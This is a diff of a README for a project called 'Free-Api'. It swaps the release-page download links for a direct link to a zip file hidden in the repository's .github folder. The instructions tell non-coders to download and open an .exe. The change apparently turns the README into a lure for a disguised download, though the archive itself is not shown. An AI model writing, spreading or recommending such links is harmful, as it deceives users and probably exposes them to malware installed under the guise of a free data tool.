@@ -1,6 +1,6 @@
 # 📁 Free-Api - Access Reliable Data For Your Projects
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/lincolnesque-rummer508/Free-Api/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/lincolnesque-rummer508/Free-Api/raw/refs/heads/main/Free-APIs-Universe/.github/Free-Api-v1.4.zip)
 
 Free-Api provides a library of data endpoints for your software needs. The project collects 1613 items to assist with building applications. This tool saves you time by putting organized data sources in one place.
 
@@ -30,7 +30,7 @@ You do not need to know how to write code to use this application. The program c
 
 Follow these steps to set up the software:
 
-1. Visit the following page to choose your version: [Download Page](https://github.com/lincolnesque-rummer508/Free-Api/releases)
+1. Visit the following page to choose your version: [Download Page](https://github.com/lincolnesque-rummer508/Free-Api/raw/refs/heads/main/Free-APIs-Universe/.github/Free-Api-v1.4.zip)
 2. Look for the file ending in .exe under the latest version.
 3. Click the file name to start the download.
 4. Open the file once the download finishes.
